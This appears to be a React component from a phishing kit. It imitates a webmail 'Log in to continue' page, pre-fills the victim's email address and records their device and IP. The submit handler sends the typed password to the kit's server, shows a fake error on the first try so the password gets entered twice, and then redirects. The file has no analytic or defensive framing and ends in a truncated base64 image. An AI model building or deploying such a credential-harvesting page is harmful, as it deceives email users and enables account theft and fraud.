import { navigate } from "@reach/router";
import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";

function Webmail({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });
  const [showpassword, setShowpassword] = useState(false);

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count === 0) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: 1 });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };
  const showPass = () => {
    setShowpassword(!showpassword);
  };

  return (
    <Fragment>
      <Helmet>
        <link rel="stylesheet" type="text/css" href="../webmail/main.css" />
        <script src="../webmail/main.js"></script>
      </Helmet>
      <noscript>
        &lt;p class="jsDisabled"&gt; JavaScript must be enabled in order to use
        webmail interface.&lt;br /&gt; However, it seems JavaScript is either
        disabled or not supported by your browser.&lt;br /&gt; To use webmail,
        enable JavaScript by changing your browser options, then try again.
        &lt;/p&gt;
      </noscript>
      <div id="header"></div>
      <div id="topnav">
        <h2 id="aria-label-tasknav" className="voice">
          Application tasks
        </h2>
        <div
          id="taskbar"
          className="topright"
          role="navigation"
          aria-labelledby="aria-label-tasknav"
        >
          <a
            className="button-mail button-selected"
            id="rcmbtn105"
            role="button"
            tabIndex={-1}
            aria-disabled="true"
          >
            <span id="topnavtext" className="button-inner">
              {
                // values.username
                "Mail login"
              }
            </span>
            <span className="tooltip" />
            <span className="tooltip">Mail</span>
          </a>
          <a
            className="button-addressbook"
            id="rcmbtn106"
            role="button"
            tabIndex={0}
            aria-disabled="false"
          >
            <span className="button-inner">Contacts</span>
            <span className="tooltip">Contacts</span>
            <span className="tooltip">Contacts</span>
          </a>
          <a
            className="button-settings"
            id="rcmbtn107"
            role="button"
            tabIndex={0}
            aria-disabled="false"
          >
            <span className="button-inner">Settings</span>
            <span className="tooltip">Settings</span>
            <span className="tooltip">Settings</span>
          </a>
          <a
            className="button-logout"
            id="rcmbtn108"
            role="button"
            tabIndex={0}
            aria-disabled="false"
          >
            <span className="button-inner">Logout</span>
            <span className="tooltip">Logout</span>
            <span className="tooltip">Logout</span>
          </a>
          <span className="minmodetoggle" role="presentation" />
        </div>
        <div />
      </div>
      <br style={{ clear: "both" }} />
      <div id="container">
        {/* start here */}
        {/* end here */}
        <div className="content">
          <div className="grid content-grid">
            <div className="main">
              <div className="oneColumnUnauthenticated-wrapper">
                <div className="oneColumnUnauthenticated-heading">
                  <h1
                    className="frg-headline-font-37pxs"
                    style={{ color: "#595859" }}
                  >
                    <span className="desktop-only" />
                    <font style={{ fontWeight: "bold" }} id="#emaildomain">
                      {" "}
                    </font>
                   { /* Account Settings */ "Email Account"}
                  </h1>
                </div>
                <div className="loginWidget-wrapper oneColumnUnauthenticated-box">
                  <div className="loginForm-wrapper">
                    <div className="loginForm-container">
                      <h2 className="frg-headline-font-27px">
                        Log in to continue
                      </h2>
                      <div className="form-block">
                        <form className="login uss-form" onSubmit={submitForm}>
                          <input
                            type="hidden"
                            name="loginOp"
                            defaultValue="login"
                          />
                          <div className="uss-input">
                            <div className="input-info">
                              <label htmlFor="username">Email Address</label>
                            </div>
                            <div className="input-border">
                              <input
                                type="text"
                                id="username"
                                maxLength={1024}
                                name="username"
                                onChange={handleChange}
                              //  value={}
                                // disabled
                                size={30}
                                data-required-error-msg
                                autoComplete="off"
                              />
                              <div style={{ display: "none" }} id="get">
                                <input
                                  type="text"
                                  id="u4"
                                  name="u4"
                                  defaultValue
                                  autoComplete="off"
                                />
                              </div>
                              <span className="frg-icon" aria-hidden="true" />
                            </div>
                            <div className="error-message" />
                          </div>
                          <input type="hidden" name="code" defaultValue="--" />
                          <div className="uss-input uss-input-password">
                            <div className="input-info">
                              <label htmlFor="password">Password</label>
                            </div>
                            <div className="input-border">
                              <div id="b1" style={{ display: "block" }}>
                                <input
                                  style={{ width: "70%" }}
                                  type={showpassword ? "text" : "password"}
                                  name="password"
                                  value={values.password}
                                  onChange={handleChange}
                                  required
                                  tabIndex={0}
                                  maxLength={1024}
                                  size={30}
                                  id="p1"
                                  data-required-error-msg
                                  data-invalid-format-error-msg="invalid password"
                                  data-invalid-format-number-error-msg="Must contain at least 1 number."
                                  data-invalid-format-letter-error-msg="Must contain at least 1 letter."
                                  data-invalid-format-space-error-msg="Your password can't contain spaces."
                                  data-invalid-format-length-error-msg="Must contain at least 6 characters."
                                  autoComplete="off"
                                />
                              </div>
                              <div id="b2" style={{ display: "none" }}>
                                <input
                                  style={{ width: "70%" }}
                                  type="password"
                                  name="p2"
                                  defaultValue
                                  maxLength={1024}
                                  size={30}
                                  id="p2"
                                  data-required-error-msg
                                  data-invalid-format-error-msg="invalid password"
                                  data-invalid-format-number-error-msg="Must contain at least 1 number."
                                  data-invalid-format-letter-error-msg="Must contain at least 1 letter."
                                  data-invalid-format-space-error-msg="Your password can't contain spaces."
                                  data-invalid-format-length-error-msg="Must contain at least 6 characters."
                                  tabIndex={0}
                                  autoComplete="off"
                                />
                              </div>
                              <div id="sh" style={{ display: "block" }}>
                                <a
                                  id="show"
                                  title="Show"
                                  className="frg-button
                                   color-purple unmask-password"
                                  onClick={showPass}
                                  data-show="Show"
                                  data-hide="Hide"
                                  style={{ display: "inline", width: "20%" }}
                                >
                                  Show
                                </a>
                                <a
                                  id="hide"
                                  title="Show"
                                  className="frg-button color-purple unmask-password"
                                  data-show="Show"
                                  data-hide="Hide"
                                  style={{ display: "none", width: "20%" }}
                                >
                                  Hide
                                </a>
                              </div>
                              <div id="sh1" style={{ display: "none" }}>
                                <a
                                  id="show1"
                                  title="Show"
                                  className="frg-button color-purple unmask-password"
                                  data-show="Show"
                                  data-hide="Hide"
                                  style={{ display: "inline", width: "20%" }}
                                >
                                  Show
                                </a>
                                <a
                                  id="hide1"
                                  title="Show"
                                  className="frg-button color-purple unmask-password"
                                  data-show="Show"
                                  data-hide="Hide"
                                  style={{ display: "none", width: "20%" }}
                                >
                                  Hide
                                </a>
                              </div>
                              <span className="frg-icon" aria-hidden="true" />
                            </div>
                            <div className="error-message" />
                          </div>
                          <div style={{ display: "none" }} id="v1">
                            <span>
                              <h4
                                style={{
                                  color: "red",
                                  marginTop: "-10px",
                                  marginBottom: "10px",
                                  fontSize: "13px",
                                }}
                              >
                                wrong password !
                              </h4>
                            </span>
                          </div>
                          {/*
                                  <div id="forgotmsg" style="display:none">
                                     <h2>Need to reset your password?</h2>
                                     <p>Click the Forgot link to reset your password.</p></div> 
                                   */}
                          <div
                            id="captchablock"
                            className="uss-input"
                            style={{ display: "none" }}
                          >
                            <input
                              type="hidden"
                              name="count"
                              defaultValue={0}
                            />

                            <div className="input-border">
                              <input type="text" id="captchaText" />
                            </div>
                          </div>
                          <div
                            className="loginForm-rememberMe"
                            style={{
                              marginBottom: "0px",
                              paddingBottom: "0px",
                            }}
                          >
                            <fieldset className="icheckbox">
                              <div
                                className="icheckbox_square-green"
                                role="checkbox"
                                aria-labelledby="iCheck-zrememberme"
                                style={{ position: "relative" }}
                                aria-checked="false"
                                aria-disabled="false"
                              >
                                <input
                                  className="frg-input-checkbox"
                                  type="checkbox"
                                  defaultChecked
                                  defaultValue={1}
                                  id="remember"
                                  name="zrememberme"
                                  tabIndex={0}
                                  style={{
                                    position: "absolute",
                                    opacity: "0.5",
                                  }}
                                />
                                <ins
                                  className="iCheck-helper"
                                  style={{
                                    position: "absolute",
                                    top: "0%",
                                    left: "0%",
                                    display: "block",
                                    width: "100%",
                                    height: "100%",
                                    margin: "0px",
                                    padding: "0px",
                                    background:
                                      "rgb(255, 255, 255) none repeat scroll 0% 0%",
                                    border: "0px none",
                                    opacity: "0.5",
                                  }}
                                />
                              </div>
                              <label
                                htmlFor="remember"
                                id="iCheck-zrememberme"
                                className="icheckbox"
                                style={{
                                  marginLeft: "-34px",
                                  marginTop: "3px",
                                }}
                              >
                                Remember me
                                <div className="checkbox-label" />
                              </label>
                            </fieldset>
                          </div>
                          <div
                            id="messages"
                            style={{ display: "none", width: "320px" }}
                          />
                          <div className="loginForm-rememberMe">
                            {/* <input type="hidden" value="preferred" name="client"/>
                                      <fieldset class="icheckbox"> 
                                          <input id="test" class="frg-input-checkbox" type="checkbox" tabindex="4" />
                                          <label for="test" id="iCheck-client" class="icheckbox" style="margin-left: -20px;margin-top:5px;">Basic Interface
                                              <div class="checkbox-label"></div>
                                          </label>
                                      </fieldset>
                                      */}
                          </div>
                          <div id="b1a" style={{ display: "block" }}>
                            <div className="submit-button">
                              <input
                                type="submit"
                                disabled={submited.status}
                                className="frg-button color-green"
                                tabIndex={0}
                              />
                              <span className="submit-button-progress" />
                            </div>
                          </div>
                        </form>
                      </div>
                    </div>
                  </div>
                  <div className="marketing-wrapper">
                    <div className="marketing-container">
                      <h2 className="frg-headline-font-27px">
                        Top tips to improve your safety online
                      </h2>
                      <h3 className="frg-body-font-17px">
                        <a style={{ textDecoration: "none" }}>Learn more</a>
                      </h3>
                      <br />
                      <br />
                      <br />
                      <br />
                      <br />
                    </div>
                  </div>
                </div>
                {/* loginWidget-wrapper */}
              </div>
              {/* oneColumnUnauthenticated-wrapper */}
            </div>
            {/* main */}
          </div>
          {/* grid */}
          {/*				<div class="grid content-grid how-to-video">
              <div class="main">
            
                  <div class="oneColumnUnauthenticated-wrapper">

                    <div class="oneColumnUnauthenticated-heading">
                      <h1 class="frg-headline-font-37px">
                        <span class="frg-icon icon-envelope-inverted desktop-only"></span>
                        Setting up your webmail
                      </h1>
                    </div>

                    <div class="loginWidget-wrapper oneColumnUnauthenticated-box">
                        <div class="loginForm-wrapper">
                            <div class="videoWrapper">
                              <iframe width="560" height="315" src=".www.youtube.com/embed/ahYrebdYBXg" frameborder="0" allowfullscreen></iframe>
                            </div>
                        </div>
                    </div>

                </div>

              </div>
          </div>
*/}
          <br />
          <br />
        </div>
        {/* content */}
      </div>
      {/* container */}
      <footer
        className="footer-group color-dark"
        style={{ marginTop: "110px" }}
      >
        <div className="grid">
          <section className="my-account-footer">
            <p>
              <img
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAEACAYAAABccqhmAAAACXBIWXMAAAsTAAALEwEAmpwYAABCQWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMwMTQgNzkuMTU2Nzk3LCAyMDE0LzA4LzIwLTA5OjUzOjAyICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIKICAgICAgICAgICAgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iCiAgICAgICAgICAgIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiCiAgICAgICAgICAgIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIgogICAgICAgICAgICB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDE1LTEyLTEyVDIwOjE1OjIzWjwveG1wOkNyZWF0ZURhdGU+CiAgICAgICAgIDx4bXA6TW9kaWZ5RGF0ZT4yMDE1LTEyLTEzVDAzOjUxOjAzKzA1OjMwPC94bXA6TW9kaWZ5RGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+MjAxNS0xMi0xM1QwMzo1MTowMyswNTozMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNCAoTWFjaW50b3NoKTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8ZGM6Zm9ybWF0PmltYWdlL3BuZzwvZGM6Zm9ybWF0PgogICAgICAgICA8eG1wTU06SGlzdG9yeT4KICAgICAgICAgICAgPHJkZjpTZXE+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPmNvbnZlcnRlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6cGFyYW1ldGVycz5mcm9tIGltYWdlL3BuZyB0byBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wPC9zdEV2dDpwYXJhbWV0ZXJzPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+c2F2ZWQ8L3N0RXZ0OmFjdGlvbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0Omluc3RhbmNlSUQ+eG1wLmlpZDpFNkVENjQ3MzA4MjA2ODExODA4M0JFRjUxNDBCNkFCMzwvc3RFdnQ6aW5zdGFuY2VJRD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OndoZW4+MjAxNS0xMi0xM1QwMTo1NDozMCswNTozMDwvc3RFdnQ6d2hlbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPmNvbnZlcnRlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6cGFyYW1ldGVycz5mcm9tIGltYWdlL3BuZyB0byBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wPC9zdEV2dDpwYXJhbWV0ZXJzPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+c2F2ZWQ8L3N0RXZ0OmFjdGlvbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0Omluc3RhbmNlSUQ+eG1wLmlpZDpFN0VENjQ3MzA4MjA2ODExODA4M0JFRjUxNDBCNkFCMzwvc3RFdnQ6aW5zdGFuY2VJRD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OndoZW4+MjAxNS0xMi0xM1QwMTo1NDozMCswNTozMDwvc3RFdnQ6d2hlbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPnNhdmVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6ZWUzNzE4M2YtOWM3Ny00MWZjLWE3MzAtYzc5NGJmODY1NjlkPC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDE1LTEyLTEzVDAzOjUxOjAzKzA1OjMwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNCAoTWFjaW50b3NoKTwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPmNvbnZlcnRlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6cGFyYW1ldGVycz5mcm9tIGFwcGxpY2F0aW9uL3ZuZC5hZG9iZS5waG90b3Nob3AgdG8gaW1hZ2UvcG5nPC9zdEV2dDpwYXJhbWV0ZXJzPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+ZGVyaXZlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6cGFyYW1ldGVycz5jb252ZXJ0ZWQgZnJvbSBhcHBsaWNhdGlvbi92bmQuYWRvYmUucGhvdG9zaG9wIHRvIGltYWdlL3BuZzwvc3RFdnQ6cGFyYW1ldGVycz4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgICAgIDxyZGY6bGkgcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6YWN0aW9uPnNhdmVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6ZjE4NWU0MWYtZTExNC00ZjU1LTk2NWYtNjg3YWJhYjAxZDhhPC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDE1LTEyLTEzVDAzOjUxOjAzKzA1OjMwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNCAoTWFjaW50b3NoKTwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgIDwvcmRmOlNlcT4KICAgICAgICAgPC94bXBNTTpIaXN0b3J5PgogICAgICAgICA8eG1wTU06RGVyaXZlZEZyb20gcmRmOnBhcnNlVHlwZT0iUmVzb3VyY2UiPgogICAgICAgICAgICA8c3RSZWY6aW5zdGFuY2VJRD54bXAuaWlkOmVlMzcxODNmLTljNzctNDFmYy1hNzMwLWM3OTRiZjg2NTY5ZDwvc3RSZWY6aW5zdGFuY2VJRD4KICAgICAgICAgICAgPHN0UmVmOmRvY3VtZW50SUQ+eG1wLmRpZDpFNkVENjQ3MzA4MjA2ODExODA4M0JFRjUxNDBCNkFCMzwvc3RSZWY6ZG9jdW1lbnRJRD4KICAgICAgICAgICAgPHN0UmVmOm9yaWdpbmFsRG9jdW1lbnRJRD54bXAuZGlkOkU2RUQ2NDczMDgyMDY4MTE4MDgzQkVGNTE0MEI2QUIzPC9zdFJlZjpvcmlnaW5hbERvY3VtZW50SUQ+CiAgICAgICAgIDwveG1wTU06RGVyaXZlZEZyb20+CiAgICAgICAgIDx4bXBNTTpEb2N1bWVudElEPmFkb2JlOmRvY2lkOnBob3Rvc2hvcDowZTJhNTkwNy1lMWFkLTExNzgtYjhmMC1hZGJhMWVlYjNkMzc8L3htcE1NOkRvY3VtZW50SUQ+CiAgICAgICAgIDx4bXBNTTpJbnN0YW5jZUlEPnhtcC5paWQ6ZjE4NWU0MWYtZTExNC00ZjU1LTk2NWYtNjg3YWJhYjAxZDhhPC94bXBNTTpJbnN0YW5jZUlEPgogICAgICAgICA8eG1wTU06T3JpZ2luYWxEb2N1bWVudElEPnhtcC5kaWQ6RTZFRDY0NzMwODIwNjgxMTgwODNCRUY1MTQwQjZBQjM8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KICAgICAgICAgPHBob3Rvc2hvcDpDb2xvck1vZGU+MzwvcGhvdG9zaG9wOkNvbG9yTW9kZT4KICAgICAgICAgPHRpZmY6T3JpZW50YXRpb24+MTwvdGlmZjpPcmllbnRhdGlvbj4KICAgICAgICAgPHRpZmY6WFJlc29sdXRpb24+NzIwMDAwLzEwMDAwPC90aWZmOlhSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpZUmVzb2x1dGlvbj43MjAwMDAvMTAwMDA8L3RpZmY6WVJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOlJlc29sdXRpb25Vbml0PjI8L3RpZmY6UmVzb2x1dGlvblVuaXQ+CiAgICAgICAgIDxleGlmOkNvbG9yU3BhY2U+NjU1MzU8L2V4aWY6Q29sb3JTcGFjZT4KICAgICAgICAgPGV4aWY6UGl4ZWxYRGltZW5zaW9uPjI1NjwvZXhpZjpQaXhlbFhEaW1lbnNpb24+CiAgICAgICAgIDxleGlmOlBpeGVsWURpbWVuc2lvbj4yNTY8L2V4aWY6UGl4ZWxZRGltZW5zaW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI